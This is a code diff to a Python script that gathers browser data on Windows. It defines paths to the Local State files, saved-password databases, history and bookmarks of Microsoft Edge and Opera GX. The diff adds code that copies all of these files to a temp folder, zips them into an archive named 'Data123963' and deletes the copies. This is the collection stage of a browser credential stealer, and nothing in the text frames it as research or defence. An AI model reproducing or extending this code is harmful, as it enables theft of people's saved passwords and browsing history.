@@ -1,6 +1,5 @@
-
 import os
-
+import shutil
 
 def main():
     BasePath = os.getenv('localappdata')
@@ -25,7 +24,7 @@ def main():
         "EDGE_HISTORY_DB_PATH": BasePath + \
                                         '\\Microsoft\\Edge\\User Data\\Default\\History',
         "EDGE_BOOKMARKS_FILE_PATH": BasePath + \
-                                        '\\Microsoft\\Edge\\User Data\\Default\\Bookmark',
+                                        '\\Microsoft\\Edge\\User Data\\Default\\Bookmarks',
         "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Local State',
         "OPERAGX_PASSWORDS_DB_PATH": BasePath + \
@@ -35,7 +34,7 @@ def main():
         "OPERAGX_HISTORY_DB_PATH": BasePath + \
                                         '\\..\\Roaming\\Opera Software\\Opera GX Stable\\History',
         "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + \
-                                        '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Bookmark'
+                                        '\\..\\Roaming\\Opera Software\\Opera GX Stable\\Bookmarks'
     }
 
     COPY_PATH = {
@@ -58,7 +57,7 @@ def main():
         "EDGE_HISTORY_DB_PATH": BasePath + \
                                         '\\Temp\\Copy\\Default\\Edge_History',
         "EDGE_BOOKMARKS_FILE_PATH": BasePath + \
-                                        '\\Temp\\Copy\\Default\\Edge_Bookmark',
+                                        '\\Temp\\Copy\\Default\\Edge_Bookmarks',
         "OPERAGX_LOCAL_STATE_FILE_PATH": BasePath + \
                                        '\\Temp\\Copy\\OPERAGX_Local_State',
         "OPERAGX_PASSWORDS_DB_PATH": BasePath + \
@@ -68,12 +67,19 @@ def main():
         "OPERAGX_HISTORY_DB_PATH": BasePath + \
                                         '\\Temp\\Copy\\OPERAGX_History',
         "OPERAGX_BOOKMARKS_FILE_PATH": BasePath + \
-                                        '\\Temp\\Copy\\OPERAGX_Bookmark',
+                                        '\\Temp\\Copy\\OPERAGX_Bookmarks',
     }
 
     if not os.path.exists(BasePath + "/Temp/Copy/"):
             os.makedirs(BasePath + "/Temp/Copy/")
 
+    for target in TARGET_FILE_PATH:
+        try:
+            shutil.copy2(TARGET_FILE_PATH[target], COPY_PATH[target])
+        except FileNotFoundError:
+            pass
+    shutil.make_archive(BasePath + "/Temp/Data123963", "zip", BasePath + "/Temp/Copy/")
+    shutil.rmtree(BasePath + "/Temp/Copy/")
 
 
 
